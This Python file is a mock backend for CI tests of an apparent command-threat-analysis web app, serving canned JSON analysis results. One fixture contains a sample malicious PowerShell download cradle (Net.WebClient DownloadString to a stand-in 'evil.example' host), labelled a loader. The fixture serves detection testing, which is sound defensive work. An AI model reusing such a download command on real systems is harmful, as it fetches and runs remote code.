#!/usr/bin/env python3
"""Minimal mock HTTP backend for Playwright CI tests.

Serves canned JSON responses so the Next.js app can SSR analysis pages
without a real database or FastAPI process.

Usage:
    python backend/scripts/mock_server.py
    python backend/scripts/mock_server.py --port 8001
"""
from __future__ import annotations

import argparse
import json
from http.server import BaseHTTPRequestHandler, HTTPServer

BANNER = {"enabled": False, "message": "", "type": "info"}
COUNT = {"count": 42}

_TECH = [{"id": "T1059.001", "name": "PowerShell", "tactic": "Execution"}]

BENIGN: dict = {
    "slug": "AAAAAAAAABBB",
    "command": "ls -la /tmp",
    "parsed": {"kind": "command", "pos": [0, 11], "parts": []},
    "parsed_error": None,
    "decoded_layers": [],
    "lolbas_match": None,
    "lolbas_matches": [],
    "gtfobins_match": None,
    "gtfobins_matches": [],
    "loldrivers_match": None,
    "threat_classes": [],
    "parent_verdict": None,
    "redacted": False,
    "extracted_urls": [],
    "extracted_ips": [],
    "vt_results": [],
    "vt_configured": False,
    "binaries_in_command": [],
    "is_private": False,
    "threat_intel": [],
    "threat_intel_configured": {"abuseipdb": False, "otx": False},
    "story": None,
    "attributed_actors": [],
    "submitter_email": None,
}

SUSPICIOUS: dict = {
    "slug": "MFRA2YLBMFRA",
    "command": "powershell -enc JABzAD0A",
    "parsed": None,
    "parsed_error": "parse error: unexpected token",
    "decoded_layers": [
        {
            "layer": 1,
            "encoding": "base64-utf16le",
            "value": "$s=New-Object Net.WebClient\n$s.DownloadString('http://evil.example')",
        }
    ],
    "lolbas_match": {
        "name": "Powershell.exe",
        "description": "PowerShell is included in Windows by default.",
        "url": "https://lolbas-project.github.io/lolbas/Binaries/Powershell/",
        "techniques": ["T1059.001"],
        "technique_details": _TECH,
        "functions": ["download", "execute"],
        "similarity": 1.0,
    },
    "lolbas_matches": [
        {
            "name": "Powershell.exe",
            "description": "PowerShell is included in Windows by default.",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Powershell/",
            "techniques": ["T1059.001"],
            "technique_details": _TECH,
            "functions": ["download", "execute"],
            "similarity": 1.0,
        }
    ],
    "gtfobins_match": None,
    "gtfobins_matches": [],
    "loldrivers_match": None,
    "threat_classes": [
        {
            "name": "loader",
            "label": "Loader",
            "confidence": "high",
            "signals": ["Executes base64-encoded PowerShell command"],
            "techniques": _TECH,
        }
    ],
    "parent_verdict": None,
    "redacted": False,
    "extracted_urls": ["http://evil.example"],
    "extracted_ips": [],
    "vt_results": [],
    "vt_configured": False,
    "binaries_in_command": [
        {
            "name": "powershell.exe",
            "source": "lolbas",
            "description": "PowerShell is included in Windows by default.",
            "abuse_note": None,
            "functions": ["download", "execute"],
            "techniques": _TECH,
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Powershell/",
        }
    ],
    "is_private": False,
    "threat_intel": [],
    "threat_intel_configured": {"abuseipdb": False, "otx": False},
    "story": None,
    "attributed_actors": [],
    "submitter_email": None,
}

DELETED = {"slug": "DELETEDSLUG1", "deleted": True}

_SLUG_MAP: dict[str, dict] = {
    "AAAAAAAAABBB": BENIGN,
    "MFRA2YLBMFRA": SUSPICIOUS,
    "DELETEDSLUG1": DELETED,
}


class _Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt: str, *args: object) -> None:  # silence request logs
        pass

    def _send(self, status: int, body: object) -> None:
        data = json.dumps(body).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header(
            "Access-Control-Allow-Headers",
            "Content-Type, Authorization, X-API-Key, X-User-Email, X-Admin-Secret",
        )
        self.send_header("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS")
        self.end_headers()
        self.wfile.write(data)

    def do_OPTIONS(self) -> None:
        self._send(204, {})

    def do_GET(self) -> None:
        path = self.path.split("?")[0]
        if path == "/health":
            self._send(200, {"status": "ok"})
        elif path == "/settings/banner":
            self._send(200, BANNER)
        elif path == "/stats/count":
            self._send(200, COUNT)
        elif path in ("/recent", "/search"):
            self._send(200, [])
        elif path.startswith("/c/"):
            slug = path[3:]
            row = _SLUG_MAP.get(slug)
            if row:
                self._send(200, row)
            else:
                self._send(404, {"code": "not_found", "detail": "Analysis not found"})
        else:
            self._send(404, {"code": "not_found", "detail": "Not found"})

    def do_POST(self) -> None:
        length = int(self.headers.get("Content-Length", 0))
        body: dict = json.loads(self.rfile.read(length)) if length else {}
        path = self.path.split("?")[0]
        if path == "/analyze":
            cmd: str = body.get("command", "").lower()
            if "powershell" in cmd or " -enc" in cmd:
                self._send(200, SUSPICIOUS)
            else:
                self._send(200, BENIGN)
        else:
            self._send(404, {"code": "not_found", "detail": "Not found"})


def main() -> None:
    parser = argparse.ArgumentParser(description="Mock backend server for Playwright CI")
    parser.add_argument("--port", type=int, default=8000)
    args = parser.parse_args()
    server = HTTPServer(("", args.port), _Handler)
    print(f"Mock backend listening on :{args.port}", flush=True)
    server.serve_forever()


if __name__ == "__main__":
    main()
